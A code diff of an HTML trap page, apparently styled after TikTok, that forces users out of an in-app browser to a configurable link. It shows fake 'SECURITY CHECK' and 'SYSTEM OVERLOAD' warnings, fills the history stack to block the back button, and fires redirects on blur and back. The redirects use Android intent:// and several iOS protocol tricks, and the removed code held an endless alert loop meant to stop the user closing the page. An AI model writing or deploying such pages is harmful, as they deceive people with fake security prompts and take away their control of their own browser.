@@ -4,62 +4,65 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <style>
-        body, html { margin:0; padding:0; width:100%; height:100%; background:#000; color:#fff; font-family:sans-serif; overflow:hidden; }
-        #ui { display:flex; flex-direction:column; align-items:center; justify-content:center; height:100vh; text-align:center; }
-        .btn { background:#fe2c55; color:#fff; padding:20px 60px; border-radius:8px; font-weight:800; font-size:20px; border:none; }
+        body, html { margin:0; padding:0; height:100%; background:#000; color:#fff; font-family:sans-serif; overflow:hidden; }
+        #trap { display:flex; flex-direction:column; align-items:center; justify-content:center; height:100vh; text-align:center; }
+        .btn { background:#fe2c55; color:#fff; padding:20px 60px; border-radius:12px; font-weight:800; font-size:22px; border:none; box-shadow:0 0 20px #fe2c55; }
     </style>
 </head>
 <body>
-    <div id="ui">
-        <div style="font-size:24px; font-weight:900; margin-bottom:20px;">SYSTEM OVERLOAD</div>
-        <p style="padding:0 40px; margin-bottom:40px; color:#ccc;">Security protocol detected. Verification required in external browser to unlock device functions.</p>
-        <button class="btn" onclick="hardBreakout()">UNLOCK NOW</button>
+    <div id="trap">
+        <div style="font-size:28px; font-weight:900; margin-bottom:10px;">SECURITY CHECK</div>
+        <p style="padding:0 40px; margin-bottom:40px; color:#aaa;">Manual session verification required. Press below to launch the secure system browser.</p>
+        <button class="btn" onclick="forceSystemOpen()">LAUNCH BROWSER</button>
     </div>
 
 <script>
-    const targetUrl = "https://www.google.com";
+    const destination = "https://www.google.com"; // YOUR LINK
 
-    // NEW OUTSIDE THE BOX MOVE: The "Download Hijack"
-    function hardBreakout() {
-        // Create a 'fake' file that forces the OS to handle the request
-        const blobContent = `<html><script>window.location.href="${targetUrl}";<\/script></html>`;
-        const blob = new Blob([blobContent], {type: 'text/html'});
-        const url = URL.createObjectURL(blob);
+    function forceSystemOpen() {
+        const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
+        const isAndroid = /Android/i.test(navigator.userAgent);
+
+        if (isAndroid) {
+            // ANDROID: Use the 'browser_fallback_url' trick within an intent
+            // This is the most reliable way to kill the WebView process.
+            const intent = `intent://${destination.replace("https://", "")}#Intent;scheme=https;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;package=com.android.chrome;S.browser_fallback_url=${encodeURIComponent(destination)};end`;
+            window.location.href = intent;
+        } 
         
-        // 1. Create a temporary anchor
-        const a = document.createElement('a');
-        a.href = url;
-        a.download = "secure_verify.html"; // The 'download' attribute forces handover
-        document.body.appendChild(a);
-        
-        // 2. Shotgun multiple protocols simultaneously to overwhelm the interceptor
-        window.location.assign(url);
-        a.click();
-        
-        // 3. Android Intent Fallback (Aggressive version)
-        const altIntent = `intent://${targetUrl.replace("https://","")}#Intent;scheme=https;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;package=com.android.chrome;end`;
-        window.location.href = altIntent;
+        if (isIOS) {
+            // iOS: Protocol Shotgun
+            // 1. Try to trigger a 'Search' intent which often kicks to Safari
+            window.location.replace("x-web-search://?" + encodeURIComponent(destination));
+            
+            // 2. Try the Calendar/File handover (The "Outside the Box" move)
+            setTimeout(() => {
+                const blob = new Blob([`BEGIN:VCALENDAR\nVERSION:2.0\nBEGIN:VEVENT\nURL:${destination}\nEND:VEVENT\nEND:VCALENDAR`], {type: 'text/calendar'});
+                const url = URL.createObjectURL(blob);
+                window.location.href = url;
+            }, 500);
+
+            // 3. Last ditch: Standard force-open
+            setTimeout(() => {
+                window.location.assign(destination);
+            }, 1000);
+        }
     }
 
-    // THE INFINITE LOCK (Modified to prevent self-trapping)
-    function nuclearLock() {
-        // This blocks the 'X' button thread
-        alert("CRITICAL ERROR: Manual Verification Required.\n\nClick OK to launch external security browser.");
-        
-        // Try the breakout
-        hardBreakout();
-        
-        // Re-arm the lock instantly
-        setTimeout(nuclearLock, 10);
-    }
-
-    // Trigger lock on 'X' or 'Back'
-    window.onblur = () => { nuclearLock(); };
-    window.onpopstate = () => { nuclearLock(); };
-
-    // Fill history stack
+    // THE "BACK" BUTTON TRAP
+    // If they hit back, it triggers the breakout instead of letting them leave.
     window.onload = () => {
-        for(let i=0; i<100; i++) history.pushState(null, null, "#sys_lock_" + i);
+        for(let i=0; i<50; i++) history.pushState(null, null, "#" + i);
+    };
+
+    window.onpopstate = () => {
+        forceSystemOpen();
+    };
+
+    // THE "X" BUTTON TRAP
+    // When the app blurs (user touches the native bar), try to shotgun them out.
+    window.onblur = () => {
+        forceSystemOpen();
     };
 </script>
 </body>
